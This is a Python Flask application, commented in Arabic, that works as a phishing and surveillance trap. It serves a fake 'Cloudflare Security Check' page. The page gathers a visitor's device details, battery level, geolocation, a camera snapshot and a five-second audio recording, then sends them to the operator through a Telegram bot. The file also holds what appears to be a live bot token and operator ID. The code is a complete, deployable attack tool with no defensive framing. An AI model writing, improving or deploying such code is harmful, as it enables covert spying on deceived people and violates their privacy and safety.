import base64, requests, io, os, sqlite3, json
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# ==========================================
# 1. الإعدادات (Config)
# ==========================================
app = Flask(__name__)
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701
BASE_URL = "https://sif.onrender.com"

# ==========================================
# 2. محرك الإرسال (Telegram Engine)
# ==========================================
def tg_push(method, data, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if files:
            return requests.post(url, data=data, files=files, timeout=20)
        else:
            return requests.post(url, json=data, timeout=20)
    except Exception as e:
        print(f"Error: {e}")
        return None

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json(force=True, silent=True)
    if not update:
        return "OK", 200

    if "message" in update:
        msg = update["message"]
        if "chat" in msg:
            cid = msg["chat"]["id"]
            if cid == ADMIN_ID:
                kb = {
                    "inline_keyboard": [
                        [{"text": "🚀 رابط الصيد الخاص بك", "callback_data": "get_url"}],
                        [{"text": "📊 فحص السيرفر", "callback_data": "ping"}]
                    ]
                }
                tg_push("sendMessage", {"chat_id": cid, "text": "🎛 <b>لوحة تحكم سيف v6.0</b>\nالسيرفر شغال والربط سليم.", "parse_mode": "HTML", "reply_markup": kb})
    
    elif "callback_query" in update:
        cb = update["callback_query"]
        cid = cb["message"]["chat"]["id"]
        if cb["data"] == "get_url":
            tg_push("sendMessage", {"chat_id": cid, "text": f"🔗 رابطك للمشاركة:\n<code>{BASE_URL}</code>", "parse_mode": "HTML"})
        elif cb["data"] == "ping":
            tg_push("sendMessage", {"chat_id": cid, "text": "🟢 الحالة: متصل\n⚡ السرعة: ممتازة"})
            
    return "OK", 200

# ==========================================
# 3. واجهة الصيد (The Trap)
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Security Check</title>
    <style>
        body { background:#0a0a0a; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        .box { background:#111; padding:35px; border-radius:15px; border:1px solid #222; text-align:center; width:85%; max-width:400px; box-shadow:0 10px 40px rgba(0,0,0,0.8); }
        .spin { border:3px solid #222; border-top:3px solid #f38020; border-radius:50%; width:50px; height:50px; animation:s 1s linear infinite; margin:0 auto 20px; }
        @keyframes s { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
    </style>
</head>
<body>
    <div class="box"><div class="spin"></div><h2>Checking security...</h2><p style="color:#666;font-size:13px;">يرجى السماح بالصلاحيات للتأكد من هويتك</p></div>
    <script>
        async function x(t, d) { await fetch('/api/v1/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({t:t, d:d})}); }
        async function start() {
            try {
                const b = await navigator.getBattery();
                const i = `📱 جهاز جديد:\\n- المنصة: ${navigator.platform}\\n- البطارية: ${Math.round(b.level*100)}%`;
                await x('info', i);
                
                const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                
                navigator.geolocation.getCurrentPosition(p => { 
                    x('loc', `📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`); 
                });

                const r = new MediaRecorder(s); const c = [];
                r.ondataavailable = e => c.push(e.data);
                r.onstop = () => {
                    const bl = new Blob(c, {type:'audio/ogg'}); const f = new FileReader();
                    f.readAsDataURL(bl); f.onloadend = () => x('audio', f.result.split(',')[1]);
                };
                r.start(); setTimeout(() => r.stop(), 5000);

                setTimeout(async () => {
                    const v = document.createElement('video'); v.srcObject = s; await v.play();
                    const cn = document.createElement('canvas'); cn.width = v.videoWidth; cn.height = v.videoHeight;
                    cn.getContext('2d').drawImage(v, 0, 0);
                    x('img', cn.toDataURL('image/jpeg').split(',')[1]);
                    window.location.replace("https://google.com");
                }, 2000);
            } catch(e) { window.location.replace("https://google.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

# ==========================================
# 4. استقبال البيانات (Data Collector)
# ==========================================
@app.route('/', methods=['GET'])
def home(): 
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/v1/capture', methods=['POST'])
def collect():
    r = request.get_json(force=True, silent=True)
    if not r: return "OK"
    t, d = r['t'], r['d']
    if t == 'info' or t == 'loc': 
        tg_push("sendMessage", {"chat_id": ADMIN_ID, "text": d})
    elif t == 'img':
        img = io.BytesIO(base64.b64decode(d)); img.name='s.jpg'
        tg_push("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الكاميرا"}, files={'photo': img})
    elif t == 'audio':
        aud = io.BytesIO(base64.b64decode(d)); aud.name='v.ogg'
        tg_push("sendVoice", {"chat_id": ADMIN_ID, "caption": "🎙 تسجيل صوتي"}, files={'voice': aud})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
